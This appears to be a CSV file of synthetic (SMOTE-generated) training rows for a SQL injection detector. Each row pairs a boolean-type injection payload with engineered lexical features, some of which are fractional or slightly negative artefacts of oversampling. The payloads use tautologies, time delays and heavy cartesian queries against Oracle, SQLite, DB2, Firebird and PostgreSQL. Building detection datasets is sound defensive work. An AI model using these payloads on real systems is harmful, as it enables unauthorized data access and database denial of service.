id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000013,attack,boolean,"1'+  (  select qmez where 3729  =  3729 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000081,0.436187782219193,141.83728099639325,40.837280996393254,4.074752868460617,46.837280996393254,23.0,53.0,19.0,0.3302138494984197,0.1621587522266984,0.37367016817456583,0.13395723010031604,3.0,-1.1102230246251565e-16,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.8372809963932564,0.16271900360674363,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000014,attack,boolean,"1%""   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000089,0.12019830830017242,133.9240678950343,30.92406789503432,3.955833541766397,63.0,10.0,40.0,20.92406789503432,0.4704176704417483,0.07466947149869019,0.2986778859947608,0.1562349720648007,0.0,1.0,2.0,0.0,1.0,1.0,0.0,6.0,0.9240678950343191,5.0,4.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000015,attack,boolean,"1"" where 4366  =  4366 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000132,0.3868012793112029,142.0,34.873843440042265,3.9556468898729205,42.0,23.0,52.0,25.0,0.29577464788732394,0.1619718309859155,0.36619718309859156,0.176056338028169,0.12615655995773434,0.8738434400422654,2.0,0.0,0.0,2.0,0.0,10.0,0.0,2.0,1.0,10.0,0.12615655995773456,0.8738434400422654,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000016,attack,boolean,"1  )   as ekgx where 9923  =  9923 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000293,0.033764130811688664,136.01470058176633,36.01470058176634,3.8828160462817825,42.0,23.0,54.0,17.014700581766338,0.30879039156106775,0.16909950014058472,0.39701621772137274,0.1250938905769748,2.0,0.014700581766338372,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.0,1.0,0.014700581766338594,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000017,attack,boolean,"1'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000213,0.5442501038311071,138.34419380482603,30.344193804826048,3.878296258145331,63.0,10.0,44.0,21.344193804826048,0.45539129341549156,0.07228433228817327,0.3180510620679623,0.15427331222837282,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,7.0,0.3441938048260479,5.0,4.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000018,attack,boolean,"1""   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000037,1.0522367096258218,133.54215471764908,32.54215471764908,3.6605068126751763,36.0,16.0,56.0,25.54215471764908,0.2695815525847062,0.11981402337098052,0.4193490817984318,0.19125534224588153,0.0,0.5421547176490802,2.0,0.0,0.0,1.0,0.0,12.0,0.0,2.0,1.0,9.0,0.0,0.5421547176490802,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000019,attack,boolean,"1  )   where 2679  =  2679 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000232,0.1961153545238368,141.0,32.55548809486574,4.176312660449609,69.0,16.0,41.0,15.0,0.48936170212765956,0.11347517730496454,0.2907801418439716,0.10638297872340426,0.0,-1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000020,attack,boolean,"1   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000108,0.9028274150889428,135.0730762203279,26.617949186448065,3.788800260224905,62.0,10.0,42.76410162710387,20.308974593224033,0.45905955740489107,0.07404186409756308,0.31649173306013373,0.15040684543741212,0.3089745932240322,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,6.691025406775968,0.3089745932240322,5.0,4.0,4.0,0.3089745932240321,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000021,attack,boolean,"1%'   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000027,0.41450374001925716,131.0,31.0,4.007729471712047,67.37511609762944,8.0,38.9641862020319,16.66069770033865,0.5143138633406829,0.061068702290076333,0.29743653589337327,0.12718089847586755,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,5.66069770033865,1.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000022,attack,boolean,"1"" where 7380  =  7380 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000051,0.769557020667695,138.9562267169191,33.82626396984854,4.249138689933235,69.0,16.0,38.564981373535275,15.391245343383819,0.49671123452927846,0.11517941670244138,0.27737339671267225,0.11073595205560793,0.0,1.0,2.0,0.0,1.0,2.0,0.0,4.391245343383819,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000023,attack,boolean,"1'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000011,0.48454050186758163,137.79127035822512,30.0,3.962676160561662,74.37381107467533,8.0,39.813094462662335,15.604364820887445,0.5396334953231272,0.05806174642305304,0.28902756166032195,0.11327719659349778,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,5.6043648208874455,0.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000024,attack,boolean,"1%'  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000308,0.46688067529982236,136.0,32.56763273111482,4.178764181334926,70.48671455890188,8.78381636555741,38.72946907554071,18.0,0.5182846658742785,0.06458688504086331,0.28477550790838757,0.1323529411764706,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,5.432367268885179,1.0,0.0,2.7838163655574104,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000025,attack,boolean,"1%"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""%""  =  """,nearest_attack_euclidean,R000264,0.18148997780713017,137.93133177874253,30.0,4.033033100453387,74.93133177874253,8.0,37.0,18.0,0.5432494394404305,0.05800007118216755,0.26825032921752495,0.130500160159877,0.0,3.999999999999999,0.0,0.0,1.0,2.0,0.0,4.0,2.0,0.0,2.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.9313317787425275,0.06866822125747252,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000026,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000045,0.9496722061863456,135.47766762072345,30.04466475855309,3.909711753692028,67.34367334506419,8.0,43.08932951710618,17.04466475855309,0.4969948351774164,0.05905112521972834,0.318113531692635,0.1258405079102203,0.0,1.0,2.0,0.0,1.0,1.0,0.0,6.522332379276545,0.5223323792765449,0.0,2.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000027,attack,boolean,"1""   )    )    as qrok where 8257  =  8257 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000240,1.10064322837992,132.0,34.0,3.7766675723918857,42.0,21.0,53.0,16.0,0.3181818181818182,0.1590909090909091,0.4015151515151515,0.12121212121212122,0.3618848366987768,0.6381151633012232,2.0,0.0,1.0,2.0,0.0,8.0,0.0,1.0,1.0,5.0,0.3618848366987768,0.6381151633012232,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000028,attack,boolean,"1   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000237,1.0227140166474207,133.0,29.946965499657814,4.01818876037201,67.31437924880235,8.473482749828907,41.212138001368736,16.0,0.5061231522466343,0.06371039661525493,0.30986569925841156,0.12030075187969924,0.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,6.053034500342184,0.0,0.0,2.473482749828908,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000029,attack,boolean,"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'xdce'  =  'xdce",nearest_attack_euclidean,R000252,1.2869772305654101,133.4866253879584,32.0,3.6555773697959575,42.486625387958426,15.0,56.0,20.0,0.31827420661565575,0.1123723835248919,0.41952356515959643,0.14982984469985586,6.0,-1.1102230246251565e-16,0.0,1.0,0.0,2.0,0.0,10.0,0.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,1.486625387958425,0.5133746120415748,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
